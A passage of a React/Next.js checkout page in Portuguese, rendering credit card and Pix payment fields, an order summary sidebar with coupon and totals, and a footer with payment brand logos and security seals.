                            <span key={brand.key} className={`checkout__cc-brand ${getCardBrand() === brand.key ? "checkout__cc-brand--active" : ""}`}>
                              {brand.logo}
                            </span>
                          ))}
                        </div>

                        <div className="checkout__form-group">
                          <label className="checkout__form-label">Parcelas</label>
                          <select value={cardInstallments} onChange={(e) => setCardInstallments(e.target.value)} className="checkout__form-select">
                            {installmentOptions.map((n) => (
                              <option key={n} value={n}>
                                {n === 1 ? `Pagamento à vista - ${fmt(grandTotal)}` : `${n}x de ${fmt(grandTotal / n)} sem juros`}
                              </option>
                            ))}
                          </select>
                        </div>

                        <div className="checkout__form-group">
                          <label className="checkout__form-label">Nome impresso no cartão</label>
                          <input type="text" value={cardName} onChange={(e) => setCardName(e.target.value)} className="checkout__form-input" />
                        </div>

                        <div className="checkout__form-row">
                          <div className="checkout__form-group checkout__form-group--half">
                            <label className="checkout__form-label">Validade</label>
                            <div className="checkout__expiry-row">
                              <select value={cardExpiryMonth} onChange={(e) => setCardExpiryMonth(e.target.value)} className="checkout__form-select checkout__form-select--small">
                                <option value="">Mês</option>
                                {Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")).map((m) => (
                                  <option key={m} value={m}>{m}</option>
                                ))}
                              </select>
                              <span className="checkout__expiry-sep">/</span>
                              <select value={cardExpiryYear} onChange={(e) => setCardExpiryYear(e.target.value)} className="checkout__form-select checkout__form-select--small">
                                <option value="">Ano</option>
                                {Array.from({ length: 10 }, (_, i) => String(2025 + i)).map((y) => (
                                  <option key={y} value={y}>{y}</option>
                                ))}
                              </select>
                            </div>
                          </div>
                          <div className="checkout__form-group checkout__form-group--half">
                            <label className="checkout__form-label">Código de segurança</label>
                            <input type="text" value={cardCvv} onChange={(e) => setCardCvv(e.target.value)} placeholder="" maxLength={4} className="checkout__form-input" />
                          </div>
                        </div>

                        <div className="checkout__form-group">
                          <label className="checkout__form-label">CPF do titular</label>
                          <input type="text" value={cpfTitular || cpf} onChange={(e) => setCpfTitular(e.target.value)} placeholder="999.999.999-99" maxLength={14} className="checkout__form-input" />
                        </div>

                        <label className="checkout__checkbox-label">
                          <input type="checkbox" checked={billingAddressSame} onChange={(e) => setBillingAddressSame(e.target.checked)} className="checkout__checkbox" />
                          <span>O endereço da fatura do cartão é <strong>{address ? `${address.substring(0, 25)}...` : "o mesmo de entrega"}</strong></span>
                        </label>
                      </div>
                    )}

                    {/* Pix */}
                    {paymentMethod === "pix" && (
                      <div className="checkout__pix-preview">
                        <div className="checkout__pix-preview-content">
                          <img src="/pix-logo.png" alt="PIX" style={{ width: 80, height: 32, objectFit: "contain" }} />
                          <p className="checkout__pix-preview-text">Para pagar, finalize sua compra abaixo</p>
                          <span className="checkout__pix-preview-arrow">↓</span>
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* Pending */}
                {currentStepIndex < 3 && step !== "pagamento" && (
                  <div className="checkout__section-pending">
                    <p>Aguardando o preenchimento dos dados</p>
                  </div>
                )}
              </div>

              {/* Finalizar button removed - moved to sidebar */}
            </div>

            {/* ===== SIDEBAR: Resumo do pedido ===== */}
            <div className="checkout__flow-sidebar">
              <div className="checkout__summary-box">
                <div className="checkout__summary-header">
                  <h3 className="checkout__summary-title">Resumo do pedido</h3>
                  <Link href="/checkout" onClick={() => setStep("cart")} className="checkout__link-btn">
                    Voltar para o carrinho
                  </Link>
                </div>

                <div className="checkout__summary-items">
                  {items.map((item) => (
                    <div key={item.product.id} className="checkout__summary-item">
                      <div className="checkout__summary-item-badge">{item.quantity.toFixed(2)} PC</div>
                      <div className="checkout__summary-item-thumb">
                        {item.product.images?.[0] && (
                          <Image src={item.product.images[0]} alt="" fill className="checkout__summary-item-img" sizes="50px" />
                        )}
                      </div>
                      <div className="checkout__summary-item-info">
                        <p className="checkout__summary-item-name">{item.product.name}</p>
                        <p className="checkout__summary-item-price">Preço: {fmt(item.product.price)}</p>
                        {step !== "dados" && (
                          <p className="checkout__summary-item-subtotal">Subtotal: {fmt(item.product.price * item.quantity)}</p>
                        )}
                      </div>
                    </div>
                  ))}
                </div>

                <p className="checkout__summary-note">
                  *Produtos em promoção poderão sofrer variação de preço a partir do parcelamento escolhido
                </p>

                <div className="checkout__cupom-area">
                  <button onClick={() => setCupomOpen(!cupomOpen)} className="checkout__cupom-toggle">
                    Adicionar cupom de desconto
                  </button>
                  {cupomOpen && (
                    <div className="checkout__cupom-row">
                      <input type="text" value={cupom} onChange={(e) => setCupom(e.target.value)} placeholder="Cupom" className="checkout__cupom-input" />
                      <button className="checkout__cupom-btn">OK</button>
                    </div>
                  )}
                </div>

                <div className="checkout__summary-totals">
                  <div className="checkout__total-line">
                    <span>Subtotal</span>
                    <span>{fmt(subtotal)}</span>
                  </div>
                  {discount > 0 && (
                    <div className="checkout__total-line checkout__total-line--discount">
                      <span>Descontos</span>
                      <span>R$ -{fmt(discount).replace("R$ ", "")}</span>
                    </div>
                  )}
                  <div className="checkout__total-line checkout__total-line--grand">
                    <span>Total</span>
                    <span>{fmt(grandTotal)}</span>
                  </div>
                </div>

                {/* Finalizar compra button in sidebar */}
                {step === "pagamento" && (
                  <button
                    onClick={handleFinalizarPedido}
                    disabled={loading}
                    className="checkout__action-btn checkout__action-btn--dark checkout__action-btn--finalize"
                  >
                    {loading ? "Processando..." : "Finalizar compra"}
                  </button>
                )}
              </div>
            </div>
          </div>
        )}
      </div>

      {/* ========== FOOTER ========== */}
      <footer className="checkout__footer">
        <div className="checkout__footer-inner">
          <div className="checkout__footer-badges">
            {[
              { name: "Amex", logo: <AmexLogo width={40} height={26} /> },
              { name: "Mastercard", logo: <MastercardLogo width={40} height={26} /> },
              { name: "Visa", logo: <VisaLogo width={40} height={26} /> },
              { name: "Hipercard", logo: <HipercardLogo width={40} height={26} /> },
              { name: "Elo", logo: <EloLogo width={40} height={26} /> },
              { name: "Diners", logo: <DinersLogo width={40} height={26} /> },
              { name: "PayPal", logo: <PaypalLogo width={40} height={26} /> },
              { name: "PIX", logo: <PixLogo width={40} height={26} /> },
              { name: "Boleto", logo: <BoletoLogo width={40} height={26} /> },
            ].map((badge, i) => (
              <span key={i} className="checkout__footer-badge" title={badge.name}>
                {badge.logo}
              </span>
            ))}
          </div>
          <p className="checkout__footer-legal">
            {process.env.NEXT_PUBLIC_LEGAL} - CNPJ {process.env.NEXT_PUBLIC_CNPJ} {process.env.NEXT_PUBLIC_ADDRESS}
          </p>
          <div className="checkout__footer-security">
            <span className="checkout__footer-seal">Let&apos;s Encrypt</span>
            <span className="checkout__footer-seal">VTEX PCI</span>
            <span className="checkout__footer-brand">AVANTI</span>
            <span className="checkout__footer-brand">VTEX</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
